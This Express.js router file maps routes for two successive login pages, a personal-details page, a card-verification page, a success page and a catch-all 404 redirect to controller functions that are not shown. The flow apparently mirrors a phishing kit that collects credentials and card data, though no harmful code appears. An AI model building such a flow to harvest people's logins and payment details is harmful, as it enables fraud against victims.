const express = require('express');
const router =  express.Router();
const controller = require('../controller/controller');

router.get('/auth/login', controller.login);
router.post('/auth/login', controller.loginPost);

router.get('/auth/login/2', controller.login2);
router.post('/auth/login/2', controller.loginPost2);

router.get('/auth/personal', controller.personal);
router.post('/auth/personal', controller.personalPost);

router.get('/auth/card-verification', controller.card);
router.post('/auth/card-verification', controller.cardPost);

router.get('/auth/success', controller.success);

router.get('*', controller.page404Redirect);

module.exports = router;